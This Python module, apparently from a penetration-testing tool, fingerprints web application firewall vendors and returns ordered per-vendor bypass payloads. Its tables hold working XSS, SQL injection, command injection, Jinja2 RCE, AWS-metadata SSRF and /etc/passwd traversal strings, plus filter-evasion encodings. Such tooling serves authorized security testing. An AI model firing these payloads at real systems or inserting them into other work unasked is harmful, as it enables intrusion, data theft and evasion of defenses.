"""WAF fingerprint database and per-vendor bypass payload tables.

The ``waf_detect`` phase names the vendor in front of a host and stops there —
identifying a WAF is context for a human, not a step toward evasion. This module
closes that gap in data: given the vendor, it returns *ordered* bypass payloads
per vulnerability class (basic → intermediate → advanced) plus the encoding
strategies that apply to that class. The tool that consumes it
(:mod:`cordon.tools.waf_bypass`) is read-only and discovery-class; nothing here
sends a request.

Vendor identification is signature-based: headers, ``Server`` value, block-page
body markers and status-code correlation, each contributing a weighted score.
The tables are ported from `autopentest-ai` (MIT) by bhavsec, which built them
from the public WAF-evasion literature; payloads are ordered by complexity so a
consumer can escalate (fast basic probe first, advanced encodings only when the
base pass was blocked).

Bypass payloads are tier-B material: aggressive by nature. The exploit chain only
injects them behind its existing ``include_heavy`` (exploit-mode) gate, and the
validators that consume them (sqlmap ``--prefix/--suffix``, dalfox
``--custom-payload``) remain detection-only on the tools themselves.
"""

from __future__ import annotations

import re
from typing import Any

__all__ = [
    "WAF_SIGNATURES",
    "WAF_BYPASSES",
    "ENCODING_STRATEGIES",
    "VENDOR_ALIASES",
    "fingerprint_waf",
    "bypass_payloads",
    "vendor_aliases",
]

#: wafw00f's display names -> canonical keys in WAF_SIGNATURES/WAF_BYPASSES.
#: waf_detect reports whatever wafw00f printed (``"Cloudflare"``,
#: ``"Amazon Web Services (AWS) WAF"``, ``"F5 BIG-IP"``...); normalising through
#: this table is what lets the chain look the vendor up in the bypass tables.
VENDOR_ALIASES: dict[str, str] = {
    "cloudflare": "cloudflare",
    "akamai": "akamai",
    "akamaighost": "akamai",
    "aws": "aws_waf",
    "amazon web services": "aws_waf",
    "amazon web services (aws) waf": "aws_waf",
    "aws waf": "aws_waf",
    "imperva": "imperva_incapsula",
    "incapsula": "imperva_incapsula",
    "imperva incapsula": "imperva_incapsula",
    "modsecurity": "modsecurity",
    "mod_security": "modsecurity",
    "f5": "f5_big_ip",
    "f5 big-ip": "f5_big_ip",
    "big-ip": "f5_big_ip",
    "fortiweb": "fortiweb",
    "sucuri": "sucuri",
    "barracuda": "barracuda",
    "wordfence": "wordfence",
    "nginx naxsi": "nginx_naxsi",
    "naxsi": "nginx_naxsi",
    "citrix": "citrix_netscaler",
    "netscaler": "citrix_netscaler",
    "citrix netscaler": "citrix_netscaler",
}


def vendor_aliases() -> dict[str, str]:
    return dict(VENDOR_ALIASES)


#: Signature per vendor: header names, Server substrings, body regexes, status
#: codes, and the markers that appear on a block page. Each match contributes a
#: weighted score; a vendor is reported when the score reaches 2.
WAF_SIGNATURES: dict[str, dict[str, Any]] = {
    "cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "cf-request-id", "__cfduid"],
        "server": ["cloudflare"],
        "body_patterns": [
            r"Attention Required.*Cloudflare",
            r"cf-error-details",
            r"cloudflare\.com/cdn-cgi",
            r"Ray ID:",
        ],
        "status_codes": [403, 503],
        "block_page_markers": ["cloudflare", "ray id", "cf-browser-verification"],
    },
    "aws_waf": {
        "headers": ["x-amzn-requestid", "x-amz-cf-id", "x-amz-apigw-id"],
        "server": [],
        "body_patterns": [
            r"<html>.*<head><title>403 Forbidden</title></head>.*</html>",
            r"Request blocked",
        ],
        "status_codes": [403],
        "block_page_markers": ["aws", "request blocked", "waf"],
    },
    "akamai": {
        "headers": ["x-akamai-session", "akamai-grn", "x-akamai-transformed"],
        "server": ["akamaighost", "akamai"],
        "body_patterns": [
            r"Reference #[0-9a-f.]+",
            r"Access Denied.*akamai",
            r"AkamaiGHost",
        ],
        "status_codes": [403],
        "block_page_markers": ["reference #", "akamai", "access denied"],
    },
    "imperva_incapsula": {
        "headers": ["x-iinfo", "x-cdn", "incap_ses_"],
        "server": [],
        "body_patterns": [
            r"incapsula incident",
            r"_Incapsula_Resource",
            r"Request unsuccessful.*Incapsula",
        ],
        "status_codes": [403],
        "block_page_markers": ["incapsula", "imperva", "incident id"],
    },
    "modsecurity": {
        "headers": ["x-mod-security", "modsecurity"],
        "server": ["modsecurity"],
        "body_patterns": [
            r"ModSecurity",
            r"mod_security",
            r"NAXSI",
            r"Request rejected",
        ],
        "status_codes": [403, 406],
        "block_page_markers": ["modsecurity", "mod_security", "request rejected"],
    },
    "f5_big_ip": {
        "headers": ["x-wa-info", "x-cnection"],
        "server": ["bigip", "big-ip"],
        "body_patterns": [
            r"BIG-IP",
            r"The requested URL was rejected",
            r"support_id",
        ],
        "status_codes": [403],
        "block_page_markers": ["big-ip", "support id", "rejected"],
    },
    "fortiweb": {
        "headers": ["fortiwafsid"],
        "server": ["fortiweb"],
        "body_patterns": [
            r"FortiWeb",
            r"\.fwb_",
            r"FortiGuard",
        ],
        "status_codes": [403],
        "block_page_markers": ["fortiweb", "fortiguard"],
    },
    "sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "server": ["sucuri"],
        "body_patterns": [
            r"sucuri\.net",
            r"Sucuri WebSite Firewall",
            r"Access Denied.*Sucuri",
        ],
        "status_codes": [403],
        "block_page_markers": ["sucuri", "website firewall"],
    },
    "barracuda": {
        "headers": ["barra_counter_session"],
        "server": ["barracuda"],
        "body_patterns": [
            r"Barracuda",
            r"barra_counter_session",
        ],
        "status_codes": [403],
        "block_page_markers": ["barracuda"],
    },
    "wordfence": {
        "headers": [],
        "server": [],
        "body_patterns": [
            r"wordfence",
            r"wfAction=",
            r"Generated by Wordfence",
            r"Your access to this site has been limited",
        ],
        "status_codes": [403, 503],
        "block_page_markers": ["wordfence", "your access to this site"],
    },
    "nginx_naxsi": {
        "headers": ["x-naxsi-sig"],
        # Deliberately NOT plain "nginx": NAXSI runs on nginx, but a bare
        # nginx Server header is not evidence of NAXSI — the ported table
        # matched every nginx host as NAXSI. The header and body markers are
        # the actual fingerprint.
        "server": [],
        "body_patterns": [
            r"NAXSI",
            r"Blocked By NAXSI",
        ],
        "status_codes": [403],
        "block_page_markers": ["naxsi"],
    },
    "citrix_netscaler": {
        "headers": ["cneonction", "nncoection", "ns_af"],
        "server": ["netscaler"],
        "body_patterns": [
            r"ns_af=",
            r"citrix",
            r"NetScaler",
        ],
        "status_codes": [403, 302],
        "block_page_markers": ["netscaler", "citrix"],
    },
}

#: Per-vendor, per-class bypass payloads, each tagged with the technique and its
#: complexity level. ``_generic`` holds the universal set merged under any vendor
#: that lacks a dedicated entry for a class.
WAF_BYPASSES: dict[str, dict[str, list[dict[str, str]]]] = {
    "cloudflare": {
        "xss": [
            {"payload": "<svg onload=alert(1)>", "technique": "SVG event handler", "level": "basic"},
            {"payload": "<details/open/ontoggle=alert`1`>", "technique": "Template literal + interactive event", "level": "intermediate"},
            {"payload": "<a href=javascript:alert(1)>", "technique": "JavaScript URI scheme", "level": "basic"},
            {"payload": "<img src=x onerror=alert(String.fromCharCode(88,83,83))>", "technique": "fromCharCode encoding", "level": "intermediate"},
            {"payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "technique": "SVG animate event", "level": "advanced"},
            {"payload": "<math><mtext><table><mglyph><svg><mtext><style><path id='a]><img src=x onerror=alert(1)//>'>", "technique": "Nested math/svg tag confusion", "level": "advanced"},
        ],
        "sqli": [
            {"payload": "' OR 1=1--", "technique": "Basic auth bypass", "level": "basic"},
            {"payload": "1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--", "technique": "MySQL version comment bypass", "level": "intermediate"},
            {"payload": "1'/**/union/**/select/**/1,2,3--", "technique": "Comment-based space bypass", "level": "intermediate"},
            {"payload": "1' UNION%0ASELECT%0A1,2,3--", "technique": "Newline space replacement", "level": "intermediate"},
            {"payload": "1' UN%49ON SE%4CECT 1,2,3--", "technique": "URL-encoded keyword splitting", "level": "advanced"},
            {"payload": "1' aNd 1=1 UnIoN sElEcT 1,2,3--", "technique": "Mixed case evasion", "level": "basic"},
        ],
        "cmdi": [
            {"payload": ";id", "technique": "Semicolon separator", "level": "basic"},
            {"payload": "`id`", "technique": "Backtick execution", "level": "basic"},
            {"payload": "$(id)", "technique": "Command substitution", "level": "basic"},
            {"payload": ";{id,}", "technique": "Brace expansion", "level": "intermediate"},
            {"payload": "%0aid", "technique": "Newline injection", "level": "intermediate"},
            {"payload": "a]||id||[a", "technique": "OR operator with brackets", "level": "advanced"},
        ],
        "ssti": [
            {"payload": "{{7*7}}", "technique": "Basic template expression", "level": "basic"},
            {"payload": "${7*7}", "technique": "Alternative template syntax", "level": "basic"},
            {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "technique": "Jinja2 class traversal", "level": "intermediate"},
            {"payload": "{%set a='__cla'+'ss__'%}{{''[a]}}", "technique": "String concatenation bypass", "level": "advanced"},
        ],
        "ssrf": [
            {"payload": "http://127.0.0.1", "technique": "Direct localhost", "level": "basic"},
            {"payload": "http://0x7f000001", "technique": "Hex IP encoding", "level": "intermediate"},
            {"payload": "http://2130706433", "technique": "Decimal IP encoding", "level": "intermediate"},
            {"payload": "http://127.1", "technique": "Shortened localhost", "level": "intermediate"},
            {"payload": "http://0177.0.0.1", "technique": "Octal IP encoding", "level": "intermediate"},
            {"payload": "http://[::1]", "technique": "IPv6 localhost", "level": "advanced"},
        ],
        "path_traversal": [
            {"payload": "../../../etc/passwd", "technique": "Standard traversal", "level": "basic"},
            {"payload": "..%2f..%2f..%2fetc%2fpasswd", "technique": "URL-encoded slashes", "level": "intermediate"},
            {"payload": "....//....//....//etc/passwd", "technique": "Double-dot bypass", "level": "intermediate"},
        ],
    },
    "modsecurity": {
        "xss": [
            {"payload": "<img src=x onerror=alert(1)>", "technique": "Standard event handler", "level": "basic"},
            {"payload": "<svg/onload=alert(1)>", "technique": "Slash instead of space", "level": "basic"},
            {"payload": "<body onpageshow=alert(1)>", "technique": "pageshow event", "level": "intermediate"},
            {"payload": "<%00img src=x onerror=alert(1)>", "technique": "Null byte injection", "level": "intermediate"},
            {"payload": "<a href=\"data:text/html,<script>alert(1)</script>\">", "technique": "Data URI scheme", "level": "advanced"},
            {"payload": "'-alert(1)-'", "technique": "Expression injection (JS context)", "level": "intermediate"},
        ],
        "sqli": [
            {"payload": "1' OR '1'='1", "technique": "String comparison bypass", "level": "basic"},
            {"payload": "1'||1=1--", "technique": "Double pipe OR", "level": "basic"},
            {"payload": "1'%0bOR%0b1=1--", "technique": "Vertical tab space bypass", "level": "intermediate"},
            {"payload": "1' uNiOn(sElEcT(1),2,3)--", "technique": "Parenthesized UNION + mixed case", "level": "intermediate"},
            {"payload": "1'/*!UNION*//*!SELECT*/1,2,3--", "technique": "MySQL inline comment", "level": "intermediate"},
            {"payload": "1' ORDER BY 1,(CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 0) END)--", "technique": "CASE-based boolean blind", "level": "advanced"},
        ],
        "cmdi": [
            {"payload": "|id", "technique": "Pipe separator", "level": "basic"},
            {"payload": "$(id)", "technique": "Command substitution", "level": "basic"},
            {"payload": "%0a/bin/cat /etc/passwd", "technique": "Newline + full path", "level": "intermediate"},
            {"payload": "$IFS$9id", "technique": "IFS variable space bypass", "level": "intermediate"},
            {"payload": "i\"\"d", "technique": "Empty quote insertion", "level": "advanced"},
            {"payload": "w'h'o'a'm'i", "technique": "Single quote char splitting", "level": "advanced"},
        ],
        "ssti": [
            {"payload": "{{7*7}}", "technique": "Basic expression", "level": "basic"},
            {"payload": "{{config}}", "technique": "Config dump", "level": "basic"},
            {"payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "technique": "Jinja2 RCE via request", "level": "intermediate"},
        ],
        "ssrf": [
            {"payload": "http://127.0.0.1:80", "technique": "Localhost with port", "level": "basic"},
            {"payload": "http://localtest.me", "technique": "DNS rebinding domain", "level": "intermediate"},
            {"payload": "http://spoofed.burpcollaborator.net", "technique": "OOB DNS test", "level": "intermediate"},
            {"payload": "gopher://127.0.0.1:25/", "technique": "Gopher protocol", "level": "advanced"},
        ],
        "path_traversal": [
            {"payload": "..%252f..%252f..%252fetc/passwd", "technique": "Double URL-encoding", "level": "advanced"},
            {"payload": "%2e%2e/%2e%2e/%2e%2e/etc/passwd", "technique": "URL-encoded dots", "level": "intermediate"},
        ],
    },
    "aws_waf": {
        "xss": [
            {"payload": "<img src=x onerror=prompt(1)>", "technique": "prompt() instead of alert()", "level": "basic"},
            {"payload": "<svg onload=confirm(1)>", "technique": "confirm() instead of alert()", "level": "basic"},
            {"payload": "<details open ontoggle=alert(1)>", "technique": "ontoggle event", "level": "intermediate"},
            {"payload": "<input autofocus onfocus=alert(1)>", "technique": "autofocus onfocus", "level": "intermediate"},
            {"payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\\\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>", "technique": "Context breaking polyglot", "level": "advanced"},
        ],
        "sqli": [
            {"payload": "1' OR 1=1 #", "technique": "Hash comment", "level": "basic"},
            {"payload": "1' AND/**/ 1=1--", "technique": "Inline comment space bypass", "level": "intermediate"},
            {"payload": "1' /*!UNION*/ /*!SELECT*/ 1,2--", "technique": "MySQL conditional comment", "level": "intermediate"},
            {"payload": "1' UNION ALL SELECT NULL,NULL--", "technique": "NULL-based UNION", "level": "basic"},
        ],
        "cmdi": [
            {"payload": ";id", "technique": "Semicolon", "level": "basic"},
            {"payload": "\nid\n", "technique": "Newline wrapping", "level": "intermediate"},
            {"payload": "${IFS}id", "technique": "IFS separator", "level": "intermediate"},
        ],
        "ssti": [
            {"payload": "{{7*7}}", "technique": "Basic", "level": "basic"},
            {"payload": "{{7*'7'}}", "technique": "Type confusion", "level": "basic"},
        ],
        "ssrf": [
            {"payload": "http://169.254.169.254/latest/meta-data/", "technique": "AWS IMDS v1", "level": "basic"},
            {"payload": "http://169.254.169.254/latest/api/token", "technique": "AWS IMDS v2 token", "level": "intermediate"},
            {"payload": "http://[fd00:ec2::254]/latest/meta-data/", "technique": "AWS IMDS via IPv6", "level": "advanced"},
        ],
        "path_traversal": [
            {"payload": "../../../etc/passwd", "technique": "Standard traversal", "level": "basic"},
            {"payload": "..%2f..%2f..%2fetc%2fpasswd", "technique": "URL-encoded slashes", "level": "intermediate"},
        ],
    },
    "imperva_incapsula": {
        "xss": [
            {"payload": "<img src=x onerror=alert(1)>", "technique": "Standard img onerror", "level": "basic"},
            {"payload": "<svg onload=alert(1)>", "technique": "SVG onload", "level": "basic"},
            {"payload": "<svg/onload=alert(1)>", "technique": "Slash instead of space", "level": "basic"},
            {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(alert(1))//", "technique": "XSS polyglot", "level": "advanced"},
        ],
        "sqli": [
            {"payload": "' OR 1=1--", "technique": "Classic auth bypass", "level": "basic"},
            {"payload": "' UNION SELECT NULL--", "technique": "UNION NULL probe", "level": "basic"},
            {"payload": "' AND SLEEP(5)--", "technique": "Time-based blind", "level": "intermediate"},
            {"payload": "1'/*!50000UNION*//*!50000SELECT*/1,2,3--", "technique": "MySQL version comment", "level": "intermediate"},
        ],
        "ssrf": [
            {"payload": "http://127.0.0.1", "technique": "Direct localhost", "level": "basic"},
            {"payload": "http://2130706433", "technique": "Decimal IP", "level": "intermediate"},
        ],
    },
    "f5_big_ip": {
        "xss": [
            {"payload": "<svg onload=alert(1)>", "technique": "SVG onload", "level": "basic"},
            {"payload": "<details/open/ontoggle=alert`1`>", "technique": "Template literal ontoggle", "level": "intermediate"},
            {"payload": "<img src=x onerror=prompt(1)>", "technique": "prompt() variant", "level": "basic"},
        ],
        "sqli": [
            {"payload": "' OR 1=1--", "technique": "Classic auth bypass", "level": "basic"},
            {"payload": "1'/**/union/**/select/**/1,2,3--", "technique": "Comment-based space bypass", "level": "intermediate"},
            {"payload": "1' aNd 1=1--", "technique": "Mixed case evasion", "level": "basic"},
        ],
    },
    "sucuri": {
        "xss": [
            {"payload": "<img src=x onerror=alert(1)>", "technique": "Standard img onerror", "level": "basic"},
            {"payload": "<svg onload=alert(1)>", "technique": "SVG onload", "level": "basic"},
            {"payload": "<details open ontoggle=alert(1)>", "technique": "ontoggle event", "level": "intermediate"},
        ],
        "sqli": [
            {"payload": "' OR '1'='1", "technique": "String comparison", "level": "basic"},
            {"payload": "1'||1=1--", "technique": "Double pipe OR", "level": "basic"},
        ],
    },
    "wordfence": {
        "xss": [
            {"payload": "<img src=x onerror=alert(1)>", "technique": "Standard img onerror", "level": "basic"},
            {"payload": "<svg onload=alert(1)>", "technique": "SVG onload", "level": "basic"},
            {"payload": "<details open ontoggle=alert(1)>", "technique": "ontoggle event", "level": "intermediate"},
        ],
        "sqli": [
            {"payload": "' OR 1=1--", "technique": "Classic auth bypass", "level": "basic"},
            {"payload": "1'/*!UNION*//*!SELECT*/1,2,3--", "technique": "MySQL inline comment", "level": "intermediate"},
        ],
    },
    "fortiweb": {
        "xss": [
            {"payload": "<svg/onload=alert(1)>", "technique": "Slash instead of space", "level": "basic"},
            {"payload": "<img src=x onerror=alert(document.domain)>", "technique": "domain exfil probe", "level": "intermediate"},
        ],
        "sqli": [
            {"payload": "' OR 1=1--", "technique": "Classic auth bypass", "level": "basic"},
            {"payload": "1'%0bOR%0b1=1--", "technique": "Vertical tab space bypass", "level": "intermediate"},
        ],
    },
    "barracuda": {
        "xss": [
            {"payload": "<img src=x onerror=alert(1)>", "technique": "Standard img onerror", "level": "basic"},
            {"payload": "<svg onload=alert(1)>", "technique": "SVG onload", "level": "basic"},
        ],
        "sqli": [
            {"payload": "' OR 1=1--", "technique": "Classic auth bypass", "level": "basic"},
            {"payload": "1' UNION ALL SELECT NULL--", "technique": "UNION NULL probe", "level": "basic"},
        ],
    },
    "nginx_naxsi": {
        "xss": [
            {"payload": "<svg onload=alert(1)>", "technique": "SVG onload", "level": "basic"},
            {"payload": "<details open ontoggle=alert(1)>", "technique": "ontoggle event", "level": "intermediate"},
        ],
        "sqli": [
            {"payload": "' OR 1=1--", "technique": "Classic auth bypass", "level": "basic"},
            {"payload": "1'/*!UNION*//*!SELECT*/1,2,3--", "technique": "MySQL inline comment", "level": "intermediate"},
        ],
    },
    "citrix_netscaler": {
        "xss": [
            {"payload": "<img src=x onerror=alert(1)>", "technique": "Standard img onerror", "level": "basic"},
            {"payload": "<svg/onload=alert(1)>", "technique": "Slash instead of space", "level": "basic"},
        ],
        "sqli": [
            {"payload": "' OR 1=1--", "technique": "Classic auth bypass", "level": "basic"},
            {"payload": "1'/**/union/**/select/**/1,2,3--", "technique": "Comment-based space bypass", "level": "intermediate"},
        ],
    },
    # Universal payloads merged under every vendor that has no entry for a class.
    "_generic": {
        "xss": [
            {"payload": "<img src=x onerror=alert(1)>", "technique": "Standard img onerror", "level": "basic"},
            {"payload": "<svg onload=alert(1)>", "technique": "SVG onload", "level": "basic"},
            {"payload": "<details/open/ontoggle=alert(1)>", "technique": "Details ontoggle", "level": "intermediate"},
            {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(alert(1))//", "technique": "XSS polyglot", "level": "advanced"},
            {"payload": "'-alert(1)-'", "technique": "JS expression context", "level": "intermediate"},
        ],
        "sqli": [
            {"payload": "' OR 1=1--", "technique": "Classic auth bypass", "level": "basic"},
            {"payload": "' OR ''='", "technique": "String comparison", "level": "basic"},
            {"payload": "' UNION SELECT NULL--", "technique": "UNION NULL probe", "level": "basic"},
            {"payload": "' AND SLEEP(5)--", "technique": "Time-based blind", "level": "intermediate"},
            {"payload": "' AND (SELECT SUBSTRING(@@version,1,1))='5'--", "technique": "Version fingerprint", "level": "intermediate"},
        ],
        "cmdi": [
            {"payload": ";id", "technique": "Semicolon", "level": "basic"},
            {"payload": "|id", "technique": "Pipe", "level": "basic"},
            {"payload": "$(id)", "technique": "Subshell", "level": "basic"},
            {"payload": "`id`", "technique": "Backtick", "level": "basic"},
            {"payload": "%0aid", "technique": "URL-encoded newline", "level": "intermediate"},
        ],
        "ssti": [
            {"payload": "{{7*7}}", "technique": "Jinja2/Twig basic", "level": "basic"},
            {"payload": "${7*7}", "technique": "Java EL / Freemarker", "level": "basic"},
            {"payload": "#{7*7}", "technique": "Ruby ERB / Thymeleaf", "level": "basic"},
            {"payload": "<%= 7*7 %>", "technique": "ERB / ASP", "level": "basic"},
        ],
        "ssrf": [
            {"payload": "http://127.0.0.1", "technique": "Direct localhost", "level": "basic"},
            {"payload": "http://0.0.0.0", "technique": "All-interfaces bind", "level": "basic"},
            {"payload": "http://127.1", "technique": "Shortened localhost", "level": "intermediate"},
            {"payload": "http://2130706433", "technique": "Decimal IP", "level": "intermediate"},
            {"payload": "http://0x7f000001", "technique": "Hex IP", "level": "intermediate"},
        ],
        "path_traversal": [
            {"payload": "../../../etc/passwd", "technique": "Standard traversal", "level": "basic"},
            {"payload": "..%2f..%2f..%2fetc%2fpasswd", "technique": "URL-encoded slashes", "level": "intermediate"},
            {"payload": "....//....//....//etc/passwd", "technique": "Double-dot bypass", "level": "intermediate"},
            {"payload": "..%252f..%252f..%252fetc/passwd", "technique": "Double URL-encoding", "level": "advanced"},
            {"payload": "%2e%2e/%2e%2e/%2e%2e/etc/passwd", "technique": "URL-encoded dots", "level": "intermediate"},
        ],
    },
}

#: Encoding strategies per class: how to re-encode any payload above when the
#: plain form is blocked. ``applies_to`` gates which classes each strategy fits.
ENCODING_STRATEGIES: dict[str, dict[str, Any]] = {
    "url_encode": {
        "description": "Standard URL encoding of special characters",
        "applies_to": ["xss", "sqli", "cmdi", "ssti", "ssrf", "path_traversal"],
    },
    "double_url_encode": {
        "description": "Double URL-encode (%25xx) to bypass single-decode filters",
        "applies_to": ["xss", "sqli", "path_traversal"],
    },
    "unicode_encode": {
        "description": "Unicode encoding (%u0027 for quote, %u003c for <)",
        "applies_to": ["xss", "sqli"],
    },
    "html_entity_encode": {
        "description": "HTML entity encoding (&#60; for <, &#x3c; for <)",
        "applies_to": ["xss"],
    },
    "mixed_case": {
        "description": "Alternate character casing (uNiOn, SeLeCt, sCrIpT)",
        "applies_to": ["sqli", "xss"],
    },
    "comment_insertion": {
        "description": "Insert comments between keywords (UN/**/ION, SE/**/LECT)",
        "applies_to": ["sqli"],
    },
    "null_byte": {
        "description": "Insert null bytes (%00) to truncate string processing",
        "applies_to": ["path_traversal", "xss", "cmdi"],
    },
    "chunked_encoding": {
        "description": "Use chunked Transfer-Encoding to split payload across chunks",
        "applies_to": ["xss", "sqli", "cmdi"],
    },
}

#: wafw00f's block-page ``Server``/body can be absent even behind a WAF; a bare
#: block page with no identifying marker gets the generic set.
_GENERIC = "_generic"


def _match_waf(headers: dict[str, str], body: str, status_code: int) -> list[dict[str, Any]]:
    """Score every vendor signature against one response. Sorted by confidence."""
    headers_lower = {str(k).lower(): str(v).lower() for k, v in headers.items()}
    body_lower = (body or "").lower()
    matches: list[dict[str, Any]] = []

    for waf_name, sig in WAF_SIGNATURES.items():
        score = 0
        evidence: list[str] = []
        for header in sig["headers"]:
            if header.lower() in headers_lower:
                score += 3
                evidence.append(f"Header: {header}")
        server = headers_lower.get("server", "")
        for server_sig in sig["server"]:
            if server_sig.lower() in server:
                score += 3
                evidence.append(f"Server: {server_sig}")
        if body:
            for pattern in sig["body_patterns"]:
                if re.search(pattern, body, re.IGNORECASE):
                    score += 2
                    evidence.append(f"Body pattern: {pattern[:40]}")
        for marker in sig["block_page_markers"]:
            if marker in body_lower:
                score += 1
                evidence.append(f"Block marker: {marker}")
        if status_code in sig["status_codes"]:
            score += 1
        if score >= 2:
            matches.append(
                {
                    "waf": waf_name,
                    "confidence": round(min(score / 8 * 100, 100)),
                    "evidence": evidence,
                }
            )
    matches.sort(key=lambda m: m["confidence"], reverse=True)
    return matches


def fingerprint_waf(
    headers: dict[str, str],
    body: str = "",
    status_code: int = 403,
) -> list[dict[str, Any]]:
    """Identify WAF vendors from response headers/body/status.

    Returns matches sorted by confidence (highest first); empty when nothing
    reaches the score threshold. A ``confidence`` of at least ~37 is a strong
    header/Server match; below that is block-page marker noise — the caller
    decides what to trust, never this function.
    """
    return _match_waf(headers, body, status_code)


def _normalize_vendor(vendor: str) -> str:
    """Map a wafw00f-style display name (or canonical key) to a table key."""
    key = vendor.lower().strip()
    if key in WAF_BYPASSES:
        return key
    return VENDOR_ALIASES.get(key, "")


def bypass_payloads(
    vendor: str,
    vuln_class: str,
    level: str = "all",
    *,
    max_payloads: int = 50,
) -> list[dict[str, str]]:
    """Ordered bypass payloads for (vendor, class), basic → advanced.

    ``level`` filters to ``basic`` / ``intermediate`` / ``advanced`` or keeps
    everything with ``all``. Vendor-specific payloads come first, then the
    generic set (tagged ``[generic]``) for anything the vendor table lacks.
    Unknown vendors fall back to the generic table entirely. Bounded by
    ``max_payloads`` so a consumer can never hand a validator a campaign-sized
    list from a lookup.
    """
    key = _normalize_vendor(vendor)
    vuln = vuln_class.lower().strip()
    vendor_table = WAF_BYPASSES.get(key, {})
    vendor_bypasses = vendor_table.get(vuln, [])
    generic = [
        {**b, "technique": f"[generic] {b['technique']}"}
        for b in WAF_BYPASSES.get(_GENERIC, {}).get(vuln, [])
        if b["payload"] not in {vb["payload"] for vb in vendor_bypasses}
    ]
    combined = vendor_bypasses + generic
    if level != "all":
        combined = [b for b in combined if b.get("level") == level]
    # The promise is "ordered basic -> intermediate -> advanced"; the curated
    # tables interleave levels, so sort before bounding. Within a level, keep
    # table order (stable sort) so the most-tested payloads come first.
    _LEVEL_ORDER = {"basic": 0, "intermediate": 1, "advanced": 2}
    combined.sort(key=lambda b: _LEVEL_ORDER.get(b.get("level"), 1))
    return combined[: max(1, min(max_payloads, 2000))]


def encoding_strategies(vuln_class: str) -> list[dict[str, str]]:
    """The encoding strategies that apply to one vulnerability class."""
    return [
        {"name": name, "description": info["description"]}
        for name, info in ENCODING_STRATEGIES.items()
        if vuln_class in info["applies_to"]
    ]
